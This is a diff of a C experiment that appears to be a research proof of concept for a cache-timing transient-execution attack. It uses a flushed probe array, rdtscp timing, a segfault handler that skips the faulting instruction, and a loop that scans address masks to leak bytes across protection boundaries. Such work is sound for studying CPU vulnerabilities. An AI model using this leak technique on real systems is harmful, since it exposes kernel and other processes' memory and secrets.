@@ -27,16 +27,16 @@
 
 volatile char *oraclearr;
 volatile unsigned *tmp_store;
-volatile unsigned char* addr1;
-volatile unsigned char* addr2;
-volatile unsigned char* addr3;
+volatile unsigned short* addr1;
+volatile unsigned short* addr2;
+volatile unsigned short* addr3;
 int tlb_fd;
 int shadow_offset[1024];
 const int offset = 16;
 int shadow_offset[1024];
 
-uint64_t averg[256];
-int64_t averg_rnd[256];
+uint64_t averg[65536];
+int64_t averg_rnd[65536];
 
 
 size_t memsize;
@@ -79,11 +79,12 @@ static inline void memaccess(void* p){
 }
 
 void __attribute__((optimize("-Os")))void_operations3(volatile char* a, volatile unsigned char* b){
-    addr1[offset ] = 0xf1; //  sender
-    asm volatile("mfence");
+    //addr1[offset ] = 0xf1; //  sender
+    //asm volatile("mfence");
     //read(tlb_fd, addr1, 0x0);
     //addr1[offset+128] = 0xfc;
     // oraclearr[PG_SIZE * addr3[offset]];
+    for(int i = 0; i < 20; ++i)sched_yield();
     oraclearr[PG_SIZE * addr3[offset]];
     oraclearr[PG_SIZE * addr3[offset]]; // 0xfa
     oraclearr[PG_SIZE * addr2[offset]]; // receiver; addr2 - not valid address
@@ -108,6 +109,15 @@ void void_operations1(int64_t *a, int64_t *b){
     return;
 }
 
+int is_pointer_valid(void *p) {
+    /* get the page size */
+    size_t page_size = sysconf(_SC_PAGESIZE);
+    /* find the address of the page that contains p */
+    void *base = (void *)((((size_t)p) / page_size) * page_size);
+    /* call msync, if it returns non-zero, return false */
+    return msync(base, page_size, MS_ASYNC);
+}
+
 static unsigned long long rdtscp() {
 	unsigned long long a, d;
 	asm volatile ("rdtscp" : "=a" (a), "=d" (d));
@@ -129,7 +139,7 @@ static void handler(int signum, siginfo_t *si, void* arg){
     ucontext_t *ucon = (ucontext_t*)arg;
     //printf("SIGHANDLER\n");
     // printf("SEGFAULT CODE LETS TEST FIRST BYTE %p\n", ucon->uc_mcontext.gregs[REG_RIP]);
-    ucon->uc_mcontext.gregs[REG_RIP] = ucon->uc_mcontext.gregs[REG_RIP] + 21;//17;
+    ucon->uc_mcontext.gregs[REG_RIP] = ucon->uc_mcontext.gregs[REG_RIP] + 16;//17;
 }
 
 
@@ -158,29 +168,30 @@ int  __attribute__((optimize("-O0")))main(int argc, char** argv){
     tlb_fd = open("/dev/tlb_invalidator", O_RDONLY, 0x0);
     memsize = sysconf(_SC_PAGESIZE) * 1024;
     mem = (malloc(memsize));
-    oraclearr = malloc(sizeof(char) * PG_SIZE*256);
+    oraclearr = malloc(sizeof(char) * PG_SIZE*65537);
     tmp_store = malloc(sizeof(unsigned));
     addr3[offset] = 0xfa;
     pthread_t thread;
     uint64_t mask_c = 0x0000;
 //    pthread_create(&thread, NULL, sibl_thread, NULL);
     // EVERYTHING IS INITIALIZED
+    if(!fork()){
+//		CPU_ZERO(&my_set);       /* Initialize it all to 0, i.e. no CPUs selected. */
+//		CPU_SET(1, &my_set);     /* set the bit that represents core 7. */
+//		//sched_setaffinity(0, sizeof(cpu_set_t), &my_set);
+//
+		while(1){
+			addr1[offset] = 0xc1;
+		}
+	
+	}
+
+    memset(oraclearr, 0xe0, sizeof(char) * PG_SIZE*65536);
 experiments_:
     addr2 = (volatile char*)((uint64_t)addr2s ^ mask_c);
     //printf("Running experiments\n");
     memset(averg_rnd, 0x0, 256*sizeof(int64_t));
     memset(averg, 0x0, 256*sizeof(uint64_t));
-    memset(oraclearr, 0xe0, sizeof(char) * PG_SIZE*256);
-	//if(!fork()){
-//		CPU_ZERO(&my_set);       /* Initialize it all to 0, i.e. no CPUs selected. */
-//		CPU_SET(1, &my_set);     /* set the bit that represents core 7. */
-//		//sched_setaffinity(0, sizeof(cpu_set_t), &my_set);
-//
-//		while(1){
-//			addr1[offset] = 0xfe;
-//		}
-	
-	//}
 //	CPU_ZERO(&my_set);       /* Initialize it all to 0, i.e. no CPUs selected. */
 //	CPU_SET(1, &my_set);     /* set the bit that represents core 7. */
 	//sched_setaffinity(0, sizeof(cpu_set_t), &my_set);
@@ -192,8 +203,12 @@ experiments_:
 	    for(unsigned int j = 0; j < 256; ++j){	
                 asm volatile("\tclflush (%0)\n"::"r"((void*)&oraclearr[PG_SIZE * j]));
             }
-            void_operations1(&a, &b);
+            
+	    
+	    asm volatile("mfence");
+	    void_operations1(&a, &b);
 
+	    asm volatile("mfence");
             for(unsigned int j = 0; j < 256; ++j){	
                 averg[j] += time_access((void*)(oraclearr + PG_SIZE * j));
             }
@@ -225,17 +240,21 @@ experiments_:
         //printf("Not egnough confidence\n");
         goto experiments_;
     }
-    if(averg_rnd[0xf1] >= 2){
-    	printf("\nPOssible candidate of the mask %p, with weight %d\n",mask_c, averg_rnd[0xf1]);
+    if( (averg_rnd[0xc1] >= 5) || (averg_rnd[0xc2] >= 5)){
+    	printf("\nPOssible candidate of the mask %p, with weight %d; ptr valid %d\n",mask_c, averg_rnd[0xc1], is_pointer_valid(addr2));
+    	printf("POssible candidate of the mask %p, with weight %d; ptr valid %d\n",mask_c, averg_rnd[0xc2], is_pointer_valid(addr2));
+	mask_c -= 0x1000;
     } else {
-    	printf("\r trying mask %p", mask_c);
+    	printf("\rtrying mask %p", mask_c);
     }
+    //printf("\nWinner is 0x%02x [%c], weight - %d\n", winner, winner, averg_rnd[winner]);
+    fflush(stdout);
     if(mask_c <= (0x1ULL << 48)){
 	   mask_c += 0x1000;
 	   goto experiments_;
     }
     printf("ADRESSES WERE [%p] vs [%p] : %p\n", &addr1[offset], &addr2[offset], 0xffff9a433f79b000);
-    printf("Winner is 0x%02x [%c]\n", winner, winner);
+    printf("Winner is 0x%02x [%c], weight - %d\n", winner, winner, averg_rnd[winner]);
     printf("MASK %p\n", mask_c);
     return 1;
 }
